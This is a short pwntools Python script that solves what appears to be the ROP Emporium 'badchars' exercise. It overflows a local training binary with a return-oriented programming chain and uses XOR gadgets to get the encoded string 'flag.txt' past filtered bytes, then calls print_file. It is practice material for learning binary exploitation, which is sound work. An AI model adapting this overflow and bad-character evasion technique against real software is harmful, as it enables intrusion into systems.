#!/bin/python3

from pwn import *

io = process('./badchars')
io.recvuntil(">")

xored_flag = b"dnce,vzv" # flag.txt
print_file = p64(0x00400510)

xor_r15_r14b = p64(0x00400628)
mov_r13_r12 = p64(0x00400634)
pop_r12_r13_r14_r15 = p64(0x0040069c)
pop_r14_r15 = p64(0x004006a0)
pop_rdi = p64(0x004006a3)

data_section = 0x00601038

xor_exploit = b""
data_offset = 0
value_to_xor = 2

for c in xored_flag:
    xor_exploit += pop_r14_r15
    xor_exploit += p64(value_to_xor)
    xor_exploit += p64(data_section + data_offset)
    xor_exploit += xor_r15_r14b
    data_offset += 1

payload = b""
payload += b"A" * 40

payload += pop_r12_r13_r14_r15
payload += xored_flag
payload += p64(data_section)
payload += p64(0x0) # r14
payload += p64(0x0) # r15
payload += mov_r13_r12

payload += xor_exploit

payload += pop_rdi
payload += p64(data_section)

payload += print_file

io.sendline(payload)

print(io.recvall())

